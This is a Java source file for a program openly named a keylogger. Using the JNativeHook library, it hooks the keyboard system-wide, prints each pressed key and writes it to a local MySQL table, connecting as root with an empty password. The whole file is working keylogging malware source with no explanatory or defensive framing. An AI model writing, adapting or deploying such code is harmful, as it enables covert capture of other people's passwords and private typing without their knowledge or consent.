/*
 * To change this license header, choose License Headers in Project Properties.
 * To change this template file, choose Tools | Templates
 * and open the template in the editor.
 */
package keyloggerv1;

import com.github.kwhat.jnativehook.GlobalScreen;
import com.github.kwhat.jnativehook.NativeHookException;
import com.github.kwhat.jnativehook.keyboard.NativeKeyEvent;
import com.github.kwhat.jnativehook.keyboard.NativeKeyListener;
import java.sql.*;
import java.sql.DriverManager;
import static java.sql.DriverManager.getConnection;



public class KeyloggerV1 implements NativeKeyListener{

    public static void main(String[] args) {

 
        try{
            GlobalScreen.registerNativeHook();
        } catch (NativeHookException e){
            e.printStackTrace();    
        }
        
        GlobalScreen.addNativeKeyListener(new KeyloggerV1());
    }
    
    @Override
    public void nativeKeyPressed(NativeKeyEvent e){
        System.out.println(NativeKeyEvent.getKeyText(e.getKeyCode()));
        
                insertdata(NativeKeyEvent.getKeyText(e.getKeyCode()));
    }
    //
    @Override
    public void nativeKeyReleased(NativeKeyEvent e){
        System.out.println(NativeKeyEvent.getKeyText(e.getKeyCode()));
        
    }
    
    @Override
    public void nativeKeyTyped(NativeKeyEvent e){
        
    }
    
    public void insertdata(String key){
        Connection conn = null;
        Statement stmt = null;
        try{
            Class.forName("com.mysql.cj.jdbc.Driver");
            conn = DriverManager
            .getConnection("jdbc:mysql://localhost:3306/fortnite","root","");
            
            String sql = "INSERT INTO keylogger(keyPressed) " +
                    "VALUES (?)";
            PreparedStatement preparedStatement = conn.prepareStatement(sql);
            preparedStatement.setString(1, key);
            preparedStatement.executeUpdate();
            
        } catch(SQLException se){
            se.printStackTrace();
        }catch(Exception e){
            e.printStackTrace();
        }finally{
            try{
                if(stmt != null)
                    conn.close();
            }catch(SQLException se){
                
            }
            try{
                if(conn != null)
                    conn.close();
            }catch(SQLException se){
                se.printStackTrace();
            }
                
        }
        }
}


